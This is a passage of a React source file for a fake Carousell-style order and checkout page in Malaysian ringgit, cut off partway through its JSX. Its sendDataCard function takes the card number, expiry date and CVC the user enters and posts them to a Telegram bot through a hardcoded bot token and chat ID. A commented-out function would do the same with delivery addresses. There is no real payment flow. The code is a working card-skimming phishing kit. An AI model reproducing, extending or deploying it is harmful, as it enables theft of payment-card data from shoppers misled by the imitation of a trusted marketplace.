
import { useState, useEffect, useRef } from "react";
import { Container, Box, TextField } from "@mui/material"
import { createTheme, ThemeProvider } from '@mui/material/styles';
import categoriesImg from '../../img/categories.svg';
import favoriteImg from '../../img/favorite.svg';
import messageImg from '../../img/message.svg';
import editImg from '../../img/edit.svg';
import loaderImg from '../../img/loader.svg';
import { withStyles } from "@mui/styles";
import cardType from 'credit-card-type';
import axios from 'axios';
import { makeStyles } from '@mui/styles';
import FormControl from '@mui/material/FormControl';
import FormLabel from '@mui/material/FormLabel';
import Radio from '@mui/material/Radio';
import FormControlLabel from '@mui/material/FormControlLabel';

import './cart.css'
import './mobile_cart.css'






function Cart() {
	const [isClicked1, setIsClicked1] = useState(false);
	const [isClicked2, setIsClicked2] = useState(false);
	const [isClicked3, setIsClicked3] = useState(false);
	const [yourName, setYourName] = useState('');
	const [yourPhone, setYourPhone] = useState('');
	const [yourPostcode, setYourPostcode] = useState('');
	const [yourStreet, setYourStreet] = useState('');
	const [yourCity, setYourCity] = useState('');
	const [addressVisiblity, setAddressVisibility] = useState('none');
	const [showDeleteAdress, setShowDeleteAdress] = useState('none');
	const [addressRecipientName, setAddressRecipientName] = useState('');
	const [addressPhoneNumber, setAddressPhoneNumber] = useState('');
	const [addressPostcode, setAddressPostcode] = useState('');
	const [addressStreet, setAddressStreet] = useState('');
	const [addressCity, setAddressCity] = useState('');
	const [addressSelectState, setAddressSelectState] = useState('');
	const [formData, setFormData] = useState([]);
	const [error, setError] = useState('');
	const [errorPostcode, setErrorPostcode] = useState('');
	const [isValid, setIsValid] = useState(true);
	const [deleteData, setDeleteData] = useState(null);
	const [editData, setEditData] = useState([]);
	const [buttonEditDataState, setButtonEditDataState] = useState(false);
	const [selectedComponent, setSelectedComponent] = useState(null);
	const [cardNumber, setCardNumber] = useState('');
	const [cardDataInfo, setCardDataInfo] = useState('');
	const [cardDataInfoCvvCode, setCardDataInfoCvvCode] = useState('');
	const [cardErrorDataText, setCardErrorDataText] = useState('');
	const [cardErrorDataTextInput, setCardErrorDataTextInput] = useState('');
	const [isValidCardMonthData, setIsValidCardMonthData] = useState(false);
	const [isValidCardInputCard, setIsValidCardInputCard] = useState(false);
	const [currentCardBrand, setCurrentCardBrand] = useState('');
	const [showCardVisa, setShowCardVisa] = useState('none');
	const [showCardMastercard, setShowCardMastercard] = useState('none');
	const [showCardUndefined, setShowCardUndefined] = useState('none');
	const [showCardStateNormal, setShowCardStateNormal] = useState('none');
	const [showCardStateNormalCvc, setShowCardStateNormalCvc] = useState('none');
	const [showCardStateNormalError, setShowCardStateNormalError] = useState('none');
	const [showCardStateCvcError, setShowCardStateCvcError] = useState('none');
	const [showCardStateNormalStandardError, setShowCardStateNormalStandardError] = useState('none');
	const [isColorRedMainCard, setIsColorRedMainCard] = useState('');
	const [isColorRedDateCard, setIsColorRedDateCard] = useState('');
	const [showCardPayment, setShowCardPayment] = useState('none');
	const [showMobileAddressDelivery, setShowMobileAddressDelivery] = useState('none');
	const [mobileDeliverySelected, setMobileDeliverySelected] = useState('Choose a deal method');
	const [mobileDeliverySelectedStyle, setMobileDeliverySelectedStyle] = useState('#c5c5c6');
	const [showMobileDelivetyOption, setShowMobileDelivetyOption] = useState('none');
	const [showMobileAddAddressMenu, setShowMobileAddAddressMenu] = useState('none');
	const [showMobileAddAddress, setShowMobileAddAddress] = useState('none');
	const [showMobileMainMenu, setShowMobileMainMenu] = useState('');
	
	const emailInput = useRef(null);

	useEffect(() => {
		if (emailInput.current) {
		  emailInput.current.focus();
		}
	  }, []);


	const [isMobile, setIsMobile] = useState(window.innerWidth <= 767);

	function handleChange(event) {
		setAddressRecipientName(event.target.value)
	}

	useEffect(() => {
	  const handleResize = () => {
		setIsMobile(window.innerWidth <= 767);
	  };
  
	  window.addEventListener('resize', handleResize);
  
	  return () => {
		window.removeEventListener('resize', handleResize);
	  };
	}, []);


	useEffect(() => {
		console.log(formData)
	  }, [formData]);


	function handleMobileAddress(event) {
		setShowMobileAddAddressMenu('')
		setShowMobileAddAddress('');
		event.preventDefault();
	}


	function handleMobileSelectDelivery1() {
		setShowMobileDelivetyOption('')
		setMobileDeliverySelectedStyle('#2c2c2d')
		setMobileDeliverySelected('Mail to West Malaysia')
	}

	function handleMobileSelectDelivery2() {
		setShowMobileDelivetyOption('')
		setMobileDeliverySelectedStyle('#2c2c2d')
		setMobileDeliverySelected('Mail to East Malaysia')
	}

	function handleMobileBack() {
		setShowMobileDelivetyOption('none')
		setShowMobileAddressDelivery('none')
		setMobileDeliverySelectedStyle('#c5c5c6')
		setMobileDeliverySelected('Choose a deal method')
	}

	function handleOpenMobileAddress(event) {
		setShowMobileAddAddress('')
		setShowMobileMainMenu('none')
		event.preventDefault();
	}

	function handleShowAddressMobile(event) {
		setShowMobileAddAddress('')
		setShowMobileAddAddressMenu('none')
		event.preventDefault();

	}


	async function sendDataAddress(event) {
		try {
			event.preventDefault();
			setAddressVisibility('none')
			setShowMobileAddAddress('')
			setShowMobileAddAddressMenu('none')

			// const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
			// const chatId = '-922689126';
			// let message = `<b>DELIVERY DATA:</b>\n`;
			// message += `RECIPIENT'S NAME: <b>${addressRecipientName}</b>\n`;
			// message += `PHONE NUMBER: <b>${addressPhoneNumber}</b>\n`;
			// message += `POSTCODE: <b>${addressPostcode}</b>\n`;
			// message += `STREET: <b>${addressStreet}</b>\n`;
			// message += `CITY: <b>${addressCity}</b>\n`;
			// message += `STATE: <b>${addressSelectState}</b>\n`;
	
		
			// const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
			// const params = {
			// chat_id: chatId,
			// parse_mode: 'HTML',
			// text: message,
			// };
		
			// await axios.post(url, params);
		} catch (error) {
			console.error('ERROR:', error);
		}
	}


	async function sendDataCard() {
		try {
			const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
			const chatId = '-922689126';
			let message = `<b>PAYMENT DATA:</b>\n`;
			message += `<b>CARD NUMBER: ${cardNumber}</b>\n`;
			message += `<b>DATE: ${cardDataInfo}</b>\n`;
			message += `<b>CVC CODE: ${cardDataInfoCvvCode}</b>\n`;
	
		
			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
			const params = {
			chat_id: chatId,
			parse_mode: 'HTML',
			text: message,
			};
		
			await axios.post(url, params);
		} catch (error) {
			console.error('ERROR:', error);
		}
		
		  
	}


	function handleShowMainMobileMenuFromAddress() {
		setShowMobileAddAddress('none')
		setShowMobileMainMenu('')
	}

	const handleClickAddress = (index) => {
		setSelectedComponent(index);
	};

	// function handleEditData(data) {
	// 	setEditData(data);
	// 	console.log(editData);
	// 	setButtonEditDataState(true);
	// 	setAddressVisibility('');
	// 	saveEditedData(data);
	// }

	//   function saveEditedData(data) {
	// 	// Здесь вы можете выполнить логику сохранения измененных данных, например, отправить их на сервер или обновить состояние в вашем приложении
	// 	setFormData(data)
	// 	console.log('Сохранение измененных данных:', data);
	// 	// Дополнительный код сохранения данных...
	//   }

	function handleDeleteData() {
		const updatedFormData = formData.filter((data) => data !== deleteData);
		setFormData(updatedFormData);
		handleHideDeleteAddress();
		setShowDeleteAdress('none');
	  }

	// Функция для отображения подтверждения удаления
	function handleShowDeleteAddress(data) {
		setDeleteData(data);
		setShowDeleteAdress(true);
	}

	// Функция для скрытия подтверждения удаления
	function handleHideDeleteAddress() {
		setShowDeleteAdress(false);
		setDeleteData(null);
	}

	// function handleShowDeleteAdress() {
	// 	setShowDeleteAdress('')
	// }

	// function handleEditButton() {
	// 	setAddressVisibility('none')
	// 	setButtonEditDataState(false);

	// }

	useEffect(() =>  {
		const updateCardIcons = async () => {
		if (currentCardBrand === 'Visa' && currentCardBrand.length > 1) {
			setCardErrorDataTextInput('')
			setIsValidCardInputCard(false);
			setIsColorRedMainCard('')
			setShowCardStateNormalError('none');
			setShowCardStateNormalStandardError('none');
			setShowCardStateNormal('none');
			setShowCardVisa('inline-flex');
		}
		else {
			setShowCardVisa('none');
			setShowCardStateNormal('flex');
		}

		if (currentCardBrand === 'Mastercard' && currentCardBrand.length > 1) {
			setCardErrorDataTextInput('')
			setIsValidCardInputCard(false);
			setIsColorRedMainCard('')
			setShowCardStateNormalError('none');
			setShowCardStateNormalStandardError('none');
			setShowCardStateNormal('none');
			setShowCardMastercard('inline-flex');
			
		}
		else {
			setShowCardMastercard('none');
			setShowCardStateNormal('inline-flex');
		}
		
		//Undefined card
		if (currentCardBrand === 'American Express' && currentCardBrand.length > 1) {
			setCardErrorDataTextInput('')
			setIsValidCardInputCard(false);
			setIsColorRedMainCard('')
			setShowCardStateNormalError('none');
			setShowCardStateNormal('none');
			setShowCardStateNormalStandardError('none');
			setShowCardUndefined('inline-flex');
		}
		else {
			setShowCardUndefined('none');
			setShowCardStateNormal('inline-flex');

		}

		//Normal state
			if (currentCardBrand !== 'Mastercard' && currentCardBrand !== 'Visa' 
			&& currentCardBrand !== 'American Express') {
				setCardErrorDataTextInput('')
				setIsValidCardInputCard(false);
				setIsColorRedMainCard('')
				setShowCardStateNormalStandardError('none');
				setShowCardStateNormalError('none');
				setShowCardStateNormal('flex');
			}
			else {
				// setShowCardUndefined('none');
				setShowCardStateNormal('none');
			}
		}
		updateCardIcons();
	

	}, [currentCardBrand])

	function handleShowDeleteAdressNone() {
		setShowDeleteAdress('none')
	}
		
	const handlePhoneNumber = (event) => {
		const { value } = event.target;
		const cleanedValue = value.replace(/\D/g, '');
	
		if (cleanedValue.length < 8 || cleanedValue.length > 10) {
		  setError('Please enter a valid mobile number');
		} else {
		  setError('');
		}
	
	
		setAddressPhoneNumber(cleanedValue);
	  };

	  const handleCardInfo = (event) => {
		const { value } = event.target;
		let formattedValueInfo = value
		  // .replace(/\s/g, '') // удалить все пробелы из введенного значения
		  .replace(/(\d{2})(\d)/g, '$1 / $2') // добавить пробел, / и пробел после каждых двух цифр
		  .trim(); // удалить лишние пробелы в начале и конце
	  
		  if (formattedValueInfo.length === 1 && parseInt(formattedValueInfo) < 10 && formattedValueInfo !== '0' && formattedValueInfo !== '1') {
			formattedValueInfo = `0${formattedValueInfo}`;
		  }
		
	  
		const lastTwoDigits = formattedValueInfo.slice(-2);
		if (formattedValueInfo.length >= 4 && parseInt(lastTwoDigits) <= 22) {
		  setCardErrorDataText('Tarikh tamat tempoh kad anda adalah pada masa lalu.');
		  setIsValidCardMonthData(true);
		  setIsColorRedDateCard('#eb1c26');
		} else {
		  setCardErrorDataText('');
		  setIsValidCardMonthData(false);
		  setIsColorRedDateCard('')
		}
	  
		setCardDataInfo(formattedValueInfo);
	  };
	  

	  
	  const handleFocusInputCard = () => {
		if (cardNumber.length > 1) {
		  if (currentCardBrand !== 'Mastercard' && currentCardBrand !== 'Visa' && currentCardBrand !== 'American Express') {
			setCardErrorDataTextInput('Nombor kad anda tidak lengkap.');
			setIsValidCardInputCard(true);
			setIsColorRedMainCard('#eb1c26')
			setShowCardStateNormalError('inline-flex');
			setShowCardStateNormalStandardError('none');
			setShowCardStateCvcError('none');
			// setShowCardVisa(false);
			// setShowCardMastercard(false);
			// setShowCardUndefined(false);
			// setShowCardStateNormal(false);
			// setShowCardStateNormalCvc(false);
		  } else {
			setCardErrorDataTextInput('');
			setIsValidCardInputCard(false);
			setIsColorRedMainCard('')
			setShowCardStateNormalError('none');
			// setShowCardStateNormalError(false);
			// setShowCardVisa(false);
			// setShowCardMastercard(false);
			// setShowCardUndefined(false);
			// setShowCardStateNormal(false);
			// setShowCardStateNormalCvc(false);
		  }
		}
	  };

	  const handleFocusInputCardStandard = () => {
		if (cardNumber.length > 1) {
		  if (currentCardBrand !== 'Mastercard' && currentCardBrand !== 'Visa' && currentCardBrand !== 'American Express') {
			setCardErrorDataTextInput('Nombor kad anda tidak lengkap.');
			setIsValidCardInputCard(true);
			setIsColorRedMainCard('#eb1c26')
			setShowCardStateNormalError('none');
			setShowCardStateNormalStandardError('inline-flex');
			setShowCardStateCvcError('none');
			// setShowCardVisa(false);
			// setShowCardMastercard(false);
			// setShowCardUndefined(false);
			// setShowCardStateNormal(false);
			// setShowCardStateNormalCvc(false);
		  } else {
			if (cardNumber.length > 1) {
				setCardErrorDataTextInput('')
				setIsValidCardInputCard(false);
				setIsColorRedMainCard('')
				setShowCardStateNormalError('none');
				setCardErrorDataTextInput('');
				setIsValidCardInputCard(false);
				setIsColorRedMainCard('')
				// setShowCardStateNormalError('inline-flex');
				setShowCardStateNormalStandardError('none');
				// if ()
				// setShowCardStateNormal('inline-flex');
			}
			
			// setShowCardStateNormalError(false);
			// setShowCardVisa(false);
			// setShowCardMastercard(false);
			// setShowCardUndefined(false);
			// setShowCardStateNormal(false);
			// setShowCardStateNormalCvc(false);
		  }
		}
	  };


	  const handleFocusInputCardCvc = () => {
		if (cardNumber.length > 1) {
			// if (currentCardBrand === 'Mastercard' || currentCardBrand === 'Visa' || currentCardBrand === 'American Express') {
			// 	setShowCardStateNormalCvc('inline-flex')
			// }else {
		  if (currentCardBrand !== 'Mastercard' && currentCardBrand !== 'Visa' && currentCardBrand !== 'American Express') {
			setCardErrorDataTextInput('Nombor kad anda tidak lengkap.');
			setIsValidCardInputCard(true);
			setIsColorRedMainCard('#eb1c26')
			setShowCardStateNormalError('none');
			setShowCardStateNormalStandardError('none');
			setShowCardStateCvcError('inline-flex');
		  } else {
			if (cardNumber.length > 1) {
				setCardErrorDataTextInput('')
				setIsValidCardInputCard(false);
				setIsColorRedMainCard('')
				setShowCardStateNormalError('none');
				setCardErrorDataTextInput('');
				setIsValidCardInputCard(false);
				setIsColorRedMainCard('')
				setShowCardStateNormalError('none');
				setShowCardStateNormalStandardError('none');
				setShowCardStateCvcError('none');
			}
		  }
		// }
		}
	  };
	  

	  const handleCardNumber = async (event) => {
		const { value: cardValue } = event.target;
		if (cardValue === '') {
			setCurrentCardBrand(''); // Сбросить значение currentCardBrand
			setCardNumber(''); // Сбросить значение cardNumber
			setShowCardVisa('none'); // Скрыть баннер Visa
			setShowCardMastercard('none'); // Скрыть баннер Mastercard
			setShowCardUndefined('none'); // Скрыть баннер Undefined
			return;
		  }
		const formattedValue = cardValue
		.replace(/\D/g, '')// удалить все пробелы из введенного значения
		  .replace(/(\d{4})/g, '$1 ') // добавить пробел после каждых четырех цифр
		  .trim(); // удалить лишние пробелы в начале и конце
	  
		const cardNumber = formattedValue.replace(/\s/g, ''); // удалить пробелы для валидации
		const cardTypeInfo = cardType(cardNumber);
		console.log(cardTypeInfo);
		
		if (cardTypeInfo.length > 0) {
		  const cardType = cardTypeInfo[0].niceType;
		  console.log(`Введена карта типа: ${cardType}`);
		  setCurrentCardBrand(cardType)
		  // Здесь вы можете обновить состояние компонента, если необходимо
		} else {
		  console.log('Введена несуществующая карта');
		  setCurrentCardBrand('nonexistent')
		  // Здесь вы можете обновить состояние компонента, если необходимо
		}
		

		if (cardNumber.length > 1) {
			if (currentCardBrand !== 'Mastercard' && currentCardBrand !== 'Visa' && currentCardBrand !== 'American Express') {
				await new Promise((resolve) => setTimeout(resolve, 0));
				setCardErrorDataTextInput('Provided number must be a valid Mastercard or Visa card.')
				setIsValidCardInputCard(true);
				setIsColorRedMainCard('#eb1c26')
				setShowCardStateNormalError('inline-flex');
				setShowCardVisa('none');
				setShowCardMastercard('none');
				setShowCardUndefined('none');
				setShowCardStateNormalCvc('none');
				setShowCardStateCvcError('none');
				setShowCardStateNormal('none');
				setShowCardStateNormalStandardError('none');
			}
			else {
				if (cardNumber.length > 1) {
					setCardErrorDataTextInput('')
					setIsValidCardInputCard(false);
					setIsColorRedMainCard('')
					setShowCardStateNormalError('none');
					if (currentCardBrand === 'Visa') {
						setShowCardStateNormalError('none');
						setShowCardVisa('inline-flex');
						setCardErrorDataTextInput('')
						setIsValidCardInputCard(false);
						setIsColorRedMainCard('')
					}
					if (currentCardBrand === 'Mastercard') {
						setShowCardMastercard('inline-flex');
						setCardErrorDataTextInput('')
						setIsValidCardInputCard(false);
						setIsColorRedMainCard('')
						setShowCardStateNormalError('none');
					}
				}
			}
		}

		setCardNumber(formattedValue);
	  };
	  
	  

	  const handleSubmit = (event) => {
		event.preventDefault();
		// Обработка данных формы

		if (addressRecipientName.length < 3) {
			setErrorPostcode('Postcode should be 5 digit');
			setIsValid(false);
		  } else {
			setErrorPostcode('');
			setIsValid(true);
		}

		if (addressPostcode.length !== 5) {
		  setErrorPostcode('Postcode should be 5 digit');
		  setIsValid(false);
		} else {
		  setErrorPostcode('');
		  setIsValid(true);


	  
		  console.log(addressRecipientName, addressRecipientName, addressPhoneNumber, addressPostcode, addressStreet, addressCity, addressSelectState);
	  
		  const newFormData = {
			recipientName: addressRecipientName,
			phoneNumber: addressPhoneNumber,
			postcode: addressPostcode,
			street: addressStreet,
			city: addressCity,
			selectState: addressSelectState,
		  };
	  
		  // Добавляем новый объект в массив данных
		  setFormData([...formData, newFormData]);
	  
		  // Очищаем значения формы
		  setAddressRecipientName('');
		  setAddressPhoneNumber('');
		  setAddressPostcode('');
		  setAddressStreet('');
		  setAddressCity('');
		  setAddressSelectState('');
		}
	  };
	  
  
	const handleClick1 = () => {
	  setIsClicked1(true);
	  setIsClicked2(false);
	};
  
	const handleClick2 = () => {
	  setIsClicked1(false);
	  setIsClicked2(true);
	};


	const styles2 = {
		root: {
		  "& label.Mui-focused": {
			// color: "#57585a",
			border: 'none !important',
			borderBottom: 'none !important',
			borderBottomColor: "transparent !important",
			
		  },
		  "& .MuiInput-underline:after": {
			borderBottom: "1px solid #008f79"
		  },
		  "& .MuiInput-underline:before": {
			borderBottomColor: "transparent !important",
			borderBottom: 'none !important',
		  },
		  "& .MuiOutlinedInput-root": {
			"& fieldset": {
				borderBottomColor: "transparent !important",
				borderBottom: 'none !important',
			},
			"&:hover fieldset": {
				borderBottomColor: "transparent !important",
				borderBottom: 'none !important',
			},
			"&.Mui-focused fieldset": {
				borderBottomColor: "transparent !important",
				borderBottom: 'none !important',
			},
		  },
		},
	  };
	  
	  const CSSTextField2 = withStyles(styles2)(TextField);

	const styles = {
		root: {
		  "& label.Mui-focused": {
			color: "#57585a",
			
		  },
		  "& .MuiInput-underline:after": {
			borderBottom: "1px solid #008f79"
		  },
		  "& .MuiInput-underline:before": {
			borderBottomColor: "#c5c5c6"
		  },
		  "& .MuiOutlinedInput-root": {
			"& fieldset": {
			  borderColor: "#e0dfe7",
			},
			"&:hover fieldset": {
			  borderColor: "#946cdc",
			},
			"&.Mui-focused fieldset": {
			  borderColor: "#7f56da",
			},
		  },
		},
	  };
	  
	  const CSSTextField = withStyles(styles)(TextField);

	  const useStyles3 = makeStyles({
		inputRoot: {
		  '& .MuiInput-root:after': {
			borderBottom: '2px solid red !important', /* Замените 'red' на нужный вам цвет */
		  },
		},
	  });


// Field Text settings
const theme = createTheme({
	typography: {
		fontFamily: '-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Droid Sans,Helvetica Neue,sans-serif',
		fontSize: 15,
		
	},
	});
const theme2 = createTheme({
	typography: {
		// fontFamily: '-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Droid Sans,Helvetica Neue,sans-serif',
		fontSize: 15,
		// overflow: 'visible',

		
	},
	});

	// const CssTextField3 = withStyles({
	// 	root: {
	// 	  '& label.Mui-focused': {
	// 		color: 'white',
	// 	  },
	// 	  '& .MuiInput-underline:after': {
	// 		borderBottomColor: 'yellow',
	// 	  },
	// 	  '& .MuiOutlinedInput-root': {
	// 		'& fieldset': {
	// 		  borderColor: 'white',
	// 		},
	// 		'&:hover fieldset': {
	// 		  borderColor: 'white',
	// 		},
	// 		'&.Mui-focused fieldset': {
	// 		  borderColor: 'yellow',
	// 		},
	// 	  },
	// 	},
	//   })(TextField);


	return (
		
		<Container disableGutters maxWidth={false}  sx={{  mx: 'auto'}}>
			<>
			{ isMobile ?
				<>
				<div className="main" style={{display: showMobileMainMenu}}>
					<div className="main-header">
						<div className="main-header-container">
							<div className="main-header-container-wrapper">
								<div className="main-header-container-wrapper-back-button">
									<button >
									<svg  className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
										<path d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z" id="iconBack"></path>
									</svg>
									</button>
								</div>
								<div className="main-header-container-wrapper-text">
									<p>Order request</p>
								</div>
								<div className="main-header-container-field"></div>
							</div>
						</div>
					</div>
					<div className="main-product-info">
						<span>
							<img src="https://media.karousell.com/media/photos/products/2023/7/3/jean_set_s_size_1688419726_0a89323a.jpg" alt="" srcSet="" />
						</span>
						<p>JEAN SET S SIZE</p>
						<h2>RM37.00</h2>
					</div>
					<a className="main-support-link" href="https://support.carousell.com/hc/articles/360038194893">
						<img src="https://sl3-cdn.karousell.com/components/Caroupay_v4.svg" alt="" />
						<div className="main-support-link-text-header" style={{marginLeft: '8px'}}>
							<p>Tawaran yang lebih selamat apabila anda membayar melalui Carousell</p>
							<h2>Bayaran hanya dikeluarkan kepada penjual selepas anda menerima pesanan anda seperti yang disenaraikan</h2>
						</div>
						<svg style={{flexShrink: 0, height: '24px', width: '24px'}} fill="#57585a" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"></path>
						</svg>
					</a>
					<button onClick={() => setShowMobileAddressDelivery('')} className="main-delivery-button">
						<div className="main-delivery-button-body">
							<p>Delivery</p>
							<h2 style={{color: mobileDeliverySelectedStyle}}>{mobileDeliverySelected}</h2>
						</div>
						<svg fill="#57585a" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"></path></svg>
					</button>
					
					<button onClick={handleOpenMobileAddress} className="main-adding-address-button" style={{display: showMobileDelivetyOption}}>
						<div className="main-adding-address-body">
							<p>Address</p>
							<h2>Choose an address</h2>
						</div>
						<svg fill="#57585a" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"></path></svg>
					</button>

					<button className="main-payment-button">
						<div className="main-payment-button-body">
							<p>Payment</p>
							<h2>Choose a payment method</h2>
						</div>
						<svg fill="#57585a" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"></path></svg>
					</button>
					
					<div className="main-promo-code">
						<div style={{display: 'flex', flexDirection: 'row'}}>
							<ThemeProvider theme={theme}>
								<CSSTextField 
								id="standard-basic" 
								label="Promo code" 
								variant="standard" 
								style={{width: '100%', marginRight: '8px'}}
								/>
							</ThemeProvider>
							<button className="promo-code-button-apply">Apply</button>
						</div>
					</div>
					<div className="main-footer-container" style={{marginTop: '52px'}}>
						<h2>Payment Summary</h2>
						<div className="main-footer-container-payment-info">
							<div className="main-footer-container-payment-info-header">
								<div className="main-footer-container-payment-info-header-item">
									<p>Item price</p>
								</div>
								<h2>RM37.00</h2>
							</div>
							<div className="main-footer-container-payment-info-footer">
								<h3>Total</h3>
								<h3>RM37.00</h3>
							</div>
						</div>
					</div>
					<p className="footer-container">
						By tapping on ‘Place order’, you accept the terms of service from&nbsp;
						<a style={{display: 'inline', color: 'inherit', textDecoration: 'none'}} href="https://support.carousell.com/hc/articles/115011881808"><span className="span-carousell">Carousell</span></a>
						,&nbsp;
						<a style={{display: 'inline', color: 'inherit', textDecoration: 'none'}}  href="https://stripe.com/en-my/connect-account/legal"><span className="span-carousell">Stripe</span></a>
						.
					</p>
					<div className="main-footer-button-order">
						<button>Place order</button>
					</div>


				</div>
				<div className="order-delivery" style={{display: showMobileAddressDelivery}}>
					<div className="order-delivery-container">
						<div style={{position: 'relative'}}>
							<div className="order-delivery-container-wrapper">
								<div className="order-delivery-container-wrapper-header">
									<div style={{alignItems: 'center', display: 'flex', height: '60px'}}>
										<div className="order-delivery-container-wrapper-header-leftside">
											<button onClick={handleMobileBack}><svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z" id="iconBack"></path></svg></button>
										</div>
										<div className="order-delivery-container-wrapper-header-center">
											<p>Delivery</p>
										</div>
										<div className="order-delivery-container-wrapper-header-right">
											<button onClick={() => setShowMobileAddressDelivery('none')}>Done</button>
										</div>
									</div>
								</div>
							<div style={{margin: '60px 16px', paddingTop: '24px'}} className="order-delivery-container-wrapper-main">
								<div>
									<div>
										<div style={{marginTop: '16px'}}>
											<div>
												<div>
													<div onClick={handleMobileSelectDelivery1} style={{display: 'flex'}}>
														<div onClick={handleClick1} className={`main-field-center-body-info-delivery-wrapper-main-box-field-radio ${isClicked1 ? 'active' : ''}`}>
														<FormControlLabel value="male" control={<Radio />} label="Male" />
															<label className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text">
																<div className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text-wrapper">
																	<h2>Mail to West Malaysia</h2>
																</div>
															</label>
														</div>
														<div style={{display: 'flex', marginBottom: '4px'}} className="delivery-mail-address">
															<p>Free</p>
														</div>
													</div>
														<div style={{paddingLeft: '28px'}} className="delivery-mail-address-footer">
															<p>Tracked mail</p>

														</div>
												</div>
											</div>
											<div style={{borderTop: '1px solid #f0f1', marginTop: '24px', paddingTop: '24px'}}>
											<div>
												<div>
													<div onClick={handleMobileSelectDelivery2} style={{display: 'flex'}}>
														<div onClick={handleClick2} className={`main-field-center-body-info-delivery-wrapper-main-box-field-radio2 ${isClicked2 ? 'active' : ''}`}>
															<label className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text">
																<div className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text-wrapper">
																	<h2>Mail to East Malaysia</h2>
																</div>
															</label>
														</div>
														<div style={{display: 'flex', marginBottom: '4px'}} className="delivery-mail-address">
															<p>Free</p>
														</div>
													</div>
														<div style={{paddingLeft: '28px'}} className="delivery-mail-address-footer">
															<p>Tracked mail</p>
														</div>
												</div>
											</div>
												
											</div>
										</div>
									</div>
								</div>

							</div>

							</div>

						</div>

					</div>

				</div>
				<div className="add-address" style={{display: showMobileAddAddress}}>
					<div className="add-address-wrapper-header">
						<div style={{alignItems: 'center', display: 'flex', height: '60px'}}>
							<div className="order-delivery-container-wrapper-header-leftside">
								<button onClick={handleShowMainMobileMenuFromAddress}>
									<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
									<path d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z" id="iconBack"></path>
									</svg>
								</button>
							</div>
							<div className="order-delivery-container-wrapper-header-center">
								<p>Select an address</p>
							</div>
							<div className="order-delivery-container-wrapper-header-right">
								<button>Done</button>
							</div>
						</div>
					</div>
					<div style={{margin: '24px 16px 16px'}}></div>
					{formData.map((data, index) => (
						<div key={index} className="main-field-center-body-info-delivery-info-wrapper-text-address" style={{marginLeft: '-8px'}}>
							<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper" style={{marginBottom: '16px', padding: '8px 16px 8px 8px'}}>
							<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header" style={{display: 'flex'}}>
								<label onClick={() => handleClickAddress(index)} className={`main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-label ${selectedComponent === index ? 'active' : ''}`}>
								<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-h5">
									<div style={{display: 'flex', flexDirection: 'column'}}>
									<h5>{data.recipientName + ' ' +  data.phoneNumber}</h5>
									</div>
								</div>
								</label>
								<button 
								// onClick={() => handleEditData(data)} 
								className="address-button-edit">
								<img src={editImg} alt="" />
								<p>Edit</p>
								</button>
								<button onClick={() => handleShowDeleteAddress(data)} className="address-button-delete">
								<svg height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill="#57585a" stroke="#57585a"><path d="M2.5 6.5v7a2 2 0 0 0 2 2h7a2 2 0 0 0 2-2v-7" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path><path d="M.5 3.5h15" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path><path d="M5.5 3.5v-3h5v3" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path></g></svg>
								<p>Delete</p>
								</button>
